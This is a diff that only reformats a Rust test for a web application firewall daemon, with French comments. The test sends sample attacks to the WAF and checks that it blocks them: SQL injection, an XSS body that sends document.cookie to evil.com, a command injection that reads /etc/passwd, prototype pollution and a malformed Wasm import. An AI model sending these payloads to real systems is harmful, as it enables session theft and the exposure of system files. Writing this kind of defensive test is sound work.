@@ -31,9 +31,7 @@ pub fn execute_waf_daemon_test() -> bool {
 
     let attenuated = admin_cap
         .attenuate(
-            waf_rights::INSPECT_REQUEST
-                | waf_rights::INSPECT_RESPONSE
-                | waf_rights::AUDIT_INSPECT,
+            waf_rights::INSPECT_REQUEST | waf_rights::INSPECT_RESPONSE | waf_rights::AUDIT_INSPECT,
             500,
         )
         .expect("Atténuation monotone WafCap");
@@ -61,13 +59,20 @@ pub fn execute_waf_daemon_test() -> bool {
     let mut waf = JamboWafDaemon::new(admin_cap);
     waf.init_defaults();
     assert!(waf.rule_count >= 10, "Règles standard OWASP initialisées");
-    kprintln!("  [OK] Initialisation du moteur WAF et règles OWASP Top 10 ({})", waf.rule_count);
+    kprintln!(
+        "  [OK] Initialisation du moteur WAF et règles OWASP Top 10 ({})",
+        waf.rule_count
+    );
 
     // 3. Inspection d'une requête HTTP légitime (Autorisation normale)
     let mut req_clean = HttpRequest::new([192, 168, 1, 42], HttpMethod::Get, "/api/v1/health");
     req_clean.add_header("Host", "jambo.cloud").expect("Header");
-    req_clean.add_header("User-Agent", "JamboClient/1.0").expect("Header");
-    let dec_clean = waf.inspect_request(&admin_cap, &req_clean, 1000).expect("Inspect Clean");
+    req_clean
+        .add_header("User-Agent", "JamboClient/1.0")
+        .expect("Header");
+    let dec_clean = waf
+        .inspect_request(&admin_cap, &req_clean, 1000)
+        .expect("Inspect Clean");
     assert_eq!(dec_clean, WafDecision::Allow, "Requête propre autorisée");
     assert_eq!(waf.total_passed, 1);
     kprintln!("  [OK] Inspection de requête légitime autorisée (Allow)");
@@ -78,7 +83,9 @@ pub fn execute_waf_daemon_test() -> bool {
         HttpMethod::Get,
         "/login?user=admin'%20or%20'1'='1",
     );
-    let dec_sqli = waf.inspect_request(&admin_cap, &req_sqli, 1001).expect("Inspect SQLi");
+    let dec_sqli = waf
+        .inspect_request(&admin_cap, &req_sqli, 1001)
+        .expect("Inspect SQLi");
     match dec_sqli {
         WafDecision::Block { attack_type, .. } => {
             assert_eq!(attack_type, AttackType::SqlInjection);
@@ -92,7 +99,9 @@ pub fn execute_waf_daemon_test() -> bool {
     req_xss
         .set_body(b"<script>fetch('http://evil.com/steal?c='+document.cookie)</script>")
         .expect("Set Body");
-    let dec_xss = waf.inspect_request(&admin_cap, &req_xss, 1002).expect("Inspect XSS");
+    let dec_xss = waf
+        .inspect_request(&admin_cap, &req_xss, 1002)
+        .expect("Inspect XSS");
     match dec_xss {
         WafDecision::Block { attack_type, .. } => {
             assert_eq!(attack_type, AttackType::CrossSiteScripting);
@@ -103,10 +112,16 @@ pub fn execute_waf_daemon_test() -> bool {
 
     // 6. Détection d'Exécution de Commandes (RCE) et Quarantaine automatique
     let mut req_rce = HttpRequest::new([198, 51, 100, 77], HttpMethod::Post, "/cgi-bin/test");
-    req_rce.set_body(b"action=ping; cat /etc/passwd").expect("Set Body");
-    let dec_rce = waf.inspect_request(&admin_cap, &req_rce, 1003).expect("Inspect RCE");
+    req_rce
+        .set_body(b"action=ping; cat /etc/passwd")
+        .expect("Set Body");
+    let dec_rce = waf
+        .inspect_request(&admin_cap, &req_rce, 1003)
+        .expect("Inspect RCE");
     match dec_rce {
-        WafDecision::Quarantine { client_ip, reason, .. } => {
+        WafDecision::Quarantine {
+            client_ip, reason, ..
+        } => {
             assert_eq!(client_ip, [198, 51, 100, 77]);
             assert_eq!(reason, AttackType::CommandInjection);
         }
@@ -134,7 +149,9 @@ pub fn execute_waf_daemon_test() -> bool {
 
     // 8. Détection de Pollution de Prototype JSON
     let mut req_proto = HttpRequest::new([10, 0, 1, 53], HttpMethod::Post, "/api/v1/user/patch");
-    req_proto.add_header("Content-Type", "application/json").expect("Hdr");
+    req_proto
+        .add_header("Content-Type", "application/json")
+        .expect("Hdr");
     req_proto
         .set_body(b"{\"__proto__\": {\"isAdmin\": true}}")
         .expect("Body");
@@ -153,14 +170,19 @@ pub fn execute_waf_daemon_test() -> bool {
     let mut req_wasm = HttpRequest::new([10, 0, 1, 54], HttpMethod::Post, "/wasm/module");
     let malformed_wasm: [u8; 16] = [
         0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, // Magic + Version
-        0x02, 0x07, b's', b'y', b's', b't', b'e', b'm', // Section 2 (Import interdit 'system')
+        0x02, 0x07, b's', b'y', b's', b't', b'e',
+        b'm', // Section 2 (Import interdit 'system')
     ];
     req_wasm.set_body(&malformed_wasm).expect("Body");
     let dec_wasm = waf
         .inspect_request(&admin_cap, &req_wasm, 1006)
         .expect("Inspect Wasm");
     match dec_wasm {
-        WafDecision::Block { attack_type, .. } | WafDecision::Quarantine { reason: attack_type, .. } => {
+        WafDecision::Block { attack_type, .. }
+        | WafDecision::Quarantine {
+            reason: attack_type,
+            ..
+        } => {
             assert_eq!(attack_type, AttackType::MalformedWasm);
         }
         _ => panic!("Échec de validation de bytecode Wasm"),
@@ -180,7 +202,8 @@ pub fn execute_waf_daemon_test() -> bool {
 
     // 11. Contournement par Liste Blanche (Whitelist Bypass)
     let trusted_admin_ip = [127, 0, 0, 1];
-    waf.whitelist_ip(&admin_cap, trusted_admin_ip).expect("Whitelist");
+    waf.whitelist_ip(&admin_cap, trusted_admin_ip)
+        .expect("Whitelist");
     let req_trusted = HttpRequest::new(
         trusted_admin_ip,
         HttpMethod::Get,
@@ -189,13 +212,20 @@ pub fn execute_waf_daemon_test() -> bool {
     let dec_trusted = waf
         .inspect_request(&admin_cap, &req_trusted, 1008)
         .expect("Inspect Trusted");
-    assert_eq!(dec_trusted, WafDecision::Allow, "IP blanche autorisée sans blocage");
+    assert_eq!(
+        dec_trusted,
+        WafDecision::Allow,
+        "IP blanche autorisée sans blocage"
+    );
     kprintln!("  [OK] Contournement souverain par liste blanche (Whitelist Bypass)");
 
     // 12. Intégrité de la chaîne cryptographique d'audit SHA-256
     assert_ne!(waf.audit_chain, JamboWafDaemon::GENESIS_HASH);
     assert!(waf.audit_count >= 5);
-    kprintln!("  [OK] Chaîne d'audit cryptographique SHA-256 inaltérable (Entrées: {})", waf.audit_count);
+    kprintln!(
+        "  [OK] Chaîne d'audit cryptographique SHA-256 inaltérable (Entrées: {})",
+        waf.audit_count
+    );
 
     kprintln!("[WAF/TEST] Tous les contrôles du Pare-Feu Applicatif L7 Sandboxed (Phase 114) ont RÉUSSI avec succès.");
     true
